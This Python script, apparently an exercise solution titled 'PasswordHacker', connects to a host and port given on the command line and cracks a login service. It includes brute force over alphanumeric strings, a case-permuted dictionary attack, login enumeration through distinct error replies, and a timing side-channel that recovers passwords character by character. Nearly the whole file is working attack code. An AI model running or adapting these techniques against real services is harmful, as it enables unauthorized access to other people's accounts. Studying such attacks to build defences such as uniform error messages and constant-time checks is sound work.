import sys
import time
import json
import socket
import itertools


class PasswordHacker:
    def __init__(self):
        self.args = sys.argv
        self.hostname = self.args[1]
        self.port = int(self.args[2])
        self.my_socket = socket.socket()
        self.main()

    def main(self):
        self.my_socket.connect((self.hostname, self.port))
        self.time_based_exception()
        self.my_socket.close()

    def simple_brute_force(self):
        valid_chars = "abcdefghijklmnopqrstuvwxyz0123456789"
        i, z = 1, 1
        while z != 0:
            for y in itertools.product(valid_chars, repeat=i):
                data = "".join(y)
                self.my_socket.send(data.encode())
                response = self.my_socket.recv(1024).decode()
                if response == "Connection success!":
                    print(data)
                    z = 0
            i += 1

    def smarter_brute_force(self):
        with open('passwords.txt', 'r', encoding='utf-8') as passwords:
            for password in passwords:
                for var in itertools.product(*([letter.lower(), letter.upper()] for letter in password.rstrip())):
                    data = "".join(var)
                    self.my_socket.send(data.encode())
                    response = self.my_socket.recv(1024).decode()
                    if response == "Connection success!":
                        print(data)
                        exit()

    def catching_exception(self):
        with open('logins.txt', 'r', encoding='utf-8') as logins:
            for login in logins:
                for var in itertools.product(*([letter.lower(), letter.upper()] for letter in login.rstrip())):
                    var = "".join(var)
                    data = json.dumps({"login": f"{var}", "password": " "})
                    self.my_socket.send(data.encode())
                    response = self.my_socket.recv(1024).decode()
                    if json.loads(response) == {"result": "Wrong password!"}:
                        password = ""
                        while True:
                            for letter in "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789":
                                data = json.dumps({"login": f"{var}", "password": f"{password + letter}"})
                                self.my_socket.send(data.encode())
                                response = self.my_socket.recv(1024).decode()
                                if json.loads(response) == {"result": "Exception happened during login"}:
                                    password += letter
                                    continue
                                elif json.loads(response) == {"result": "Connection success!"}:
                                    print(json.dumps({"login": f"{var}", "password": f"{password + letter}"}))
                                    exit()
                                else:
                                    continue

    def time_based_exception(self):
        with open('logins.txt', 'r', encoding='utf-8') as logins:
            for login in logins:
                for var in itertools.product(*([letter.lower(), letter.upper()] for letter in login.rstrip())):
                    var = "".join(var)
                    data = json.dumps({"login": f"{var}", "password": " "})
                    self.my_socket.send(data.encode())
                    response = self.my_socket.recv(1024).decode()
                    if json.loads(response) == {"result": "Wrong password!"}:
                        password = ""
                        while True:
                            for letter in "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789":
                                data = json.dumps({"login": f"{var}", "password": f"{password + letter}"})
                                start = time.perf_counter()
                                self.my_socket.send(data.encode())
                                response = self.my_socket.recv(1024).decode()
                                end = time.perf_counter()
                                if (end - start) * 10 > 1:
                                    password += letter
                                    continue
                                elif json.loads(response) == {"result": "Connection success!"}:
                                    print(json.dumps({"login": f"{var}", "password": f"{password + letter}"}))
                                    exit()
                                else:
                                    continue


if __name__ == '__main__':
    program = PasswordHacker()
